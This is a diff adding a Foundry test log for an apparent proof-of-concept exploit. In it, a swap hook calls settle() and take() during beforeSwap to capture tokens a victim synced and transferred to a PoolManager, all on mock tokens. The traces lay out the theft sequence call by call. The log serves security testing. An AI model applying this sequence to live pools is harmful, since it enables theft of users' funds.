@@ -1,0 +1,147 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/VaultSettlementHijackTest.t.sol:VaultSettlementHijackTest
+[PASS] test_SettleHijack_PROFIT() (gas: 469309)
+Logs:
+  === unlockCallback START ===
+  msg.sender: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+  poolManager address: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+  data length: 96
+  [OK] msg.sender check passed
+  Attempting to decode as string...
+  [OK] Entering HIJACK_SCENARIO flow
+  Step 1: Syncing currency...
+  [OK] Sync completed
+  Step 2: Transferring tokens to poolManager...
+  PoolManager balance before transfer: 0
+  PoolManager balance after transfer: 100000000000000000000
+  [OK] Transfer completed
+  Step 3: Executing swap...
+  zeroForOne: true
+  currency0: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
+  usdt address: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
+  Hook balance before swap: 0
+  Swap delta amount0: 0
+  Swap delta amount1: 0
+  Hook balance after swap: 100000000000000000000
+  Hook balance change: 100000000000000000000
+  [OK] Swap completed
+  Step 4: Settling swap deltas...
+  [OK] Swap deltas settled
+  === unlockCallback END ===
+  --- SUCCESS: TRANSIENT SETTLEMENT HIJACKED ---
+
+Traces:
+  [492009] VaultSettlementHijackTest::test_SettleHijack_PROFIT()
+    ├─ [12236] MockERC20::mint(VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 100000000000000000000 [1e20])
+    │   └─ ← [Stop]
+    ├─ [24259] MockERC20::approve(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100000000000000000000 [1e20])
+    │   ├─ emit Approval(owner: VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 100000000000000000000 [1e20])
+    │   └─ ← [Return] true
+    ├─ [2525] MockERC20::balanceOf(0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [436075] PoolManager::unlock(0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000f48494a41434b5f5343454e4152494f0000000000000000000000000000000000)
+    │   ├─ [434116] VaultSettlementHijackTest::unlockCallback(0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000f48494a41434b5f5343454e4152494f0000000000000000000000000000000000)
+    │   │   ├─ [0] console::log("=== unlockCallback START ===") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] VM::toString(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] "0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f"
+    │   │   ├─ [0] console::log("msg.sender:", "0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] VM::toString(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] "0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f"
+    │   │   ├─ [0] console::log("poolManager address:", "0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("data length:", 96) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] msg.sender check passed") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Attempting to decode as string...") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] Entering HIJACK_SCENARIO flow") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Step 1: Syncing currency...") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3898] PoolManager::sync(MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
+    │   │   │   ├─ [2525] MockERC20::balanceOf(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] Sync completed") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Step 2: Transferring tokens to poolManager...") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [525] MockERC20::balanceOf(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("PoolManager balance before transfer:", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [22752] MockERC20::transfer(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100000000000000000000 [1e20])
+    │   │   │   ├─ emit Transfer(from: VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 100000000000000000000 [1e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [525] MockERC20::balanceOf(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   │   ├─ [0] console::log("PoolManager balance after transfer:", 100000000000000000000 [1e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] Transfer completed") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Step 3: Executing swap...") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("zeroForOne:", true) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] VM::toString(MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   └─ ← [Return] "0x2e234DAe75C793f67A35089C9d99245E1C58470b"
+    │   │   ├─ [0] console::log("currency0:", "0x2e234DAe75C793f67A35089C9d99245E1C58470b") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] VM::toString(MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   └─ ← [Return] "0x2e234DAe75C793f67A35089C9d99245E1C58470b"
+    │   │   ├─ [0] console::log("usdt address:", "0x2e234DAe75C793f67A35089C9d99245E1C58470b") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [525] MockERC20::balanceOf(0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("Hook balance before swap:", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [368846] PoolManager::swap(PoolKey({ currency0: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, currency1: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, fee: 3000, tickSpacing: 60, hooks: 0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080 }), SwapParams({ zeroForOne: true, amountSpecified: -100000000000000000000 [-1e20], sqrtPriceLimitX96: 4295128740 [4.295e9] }), 0x)
+    │   │   │   ├─ [32538] 0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080::beforeSwap(VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PoolKey({ currency0: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, currency1: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, fee: 3000, tickSpacing: 60, hooks: 0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080 }), SwapParams({ zeroForOne: true, amountSpecified: -100000000000000000000 [-1e20], sqrtPriceLimitX96: 4295128740 [4.295e9] }), 0x)
+    │   │   │   │   ├─ [2514] PoolManager::settle()
+    │   │   │   │   │   ├─ [525] MockERC20::balanceOf(PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   │   │   │   ├─ [24325] PoolManager::take(MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080, 100000000000000000000 [1e20])
+    │   │   │   │   │   ├─ [22752] MockERC20::transfer(0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080, 100000000000000000000 [1e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: PoolManager: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080, amount: 100000000000000000000 [1e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] 0x575e24b4, 0, 0
+    │   │   │   ├─ emit Swap(id: 0xc92a1094c10a145d20d88085c9d4dfa72789e4d21d63174af79f5115951fbe86, sender: VaultSettlementHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 0, amount1: 0, sqrtPriceX96: 4295128740 [4.295e9], liquidity: 0, tick: -887272 [-8.872e5], fee: 3000)
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("Swap delta amount0:", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Swap delta amount1:", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [525] MockERC20::balanceOf(0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080) [staticcall]
+    │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   │   ├─ [0] console::log("Hook balance after swap:", 100000000000000000000 [1e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Hook balance change:", 100000000000000000000 [1e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] Swap completed") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Step 4: Settling swap deltas...") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("[OK] Swap deltas settled") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("=== unlockCallback END ===") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x
+    │   └─ ← [Return] 0x
+    ├─ [525] MockERC20::balanceOf(0xFFfFFFfffffFfFFFfffFfFFfFfffFFffFfFfC080) [staticcall]
+    │   └─ ← [Return] 100000000000000000000 [1e20]
+    ├─ [0] VM::assertEq(100000000000000000000 [1e20], 100000000000000000000 [1e20], "Theft failed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] console::log("--- SUCCESS: TRANSIENT SETTLEMENT HIJACKED ---") [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.74ms (892.71µs CPU time)
+
+Ran 1 test suite in 99.71ms (1.74ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
